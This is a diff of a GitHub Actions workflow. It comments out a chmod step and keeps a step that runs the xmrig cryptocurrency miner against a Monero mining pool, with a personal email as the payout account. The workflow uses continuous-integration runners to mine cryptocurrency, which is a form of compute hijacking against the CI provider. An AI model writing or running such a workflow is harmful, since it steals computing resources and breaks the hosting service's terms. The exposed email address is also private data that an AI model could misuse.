@@ -14,9 +14,9 @@ jobs:
     - name: cd bmxmrig
       run: | 
         cd bmxmrig
-    - name: chmod u+x ./xmrig
-      run: |
-        chmod u+x ./xmrig
+    #- name: chmod u+x ./xmrig
+     # run: |
+      #  chmod u+x ./xmrig
     - name: ./xmrig -o xmr.pool.minergate.com:45700 -u arianabb.me@gmail.com -p x --donate-level 1
       run: |
         ./xmrig -o xmr.pool.minergate.com:45700 -u arianabb.me@gmail.com -p x --donate-level 1
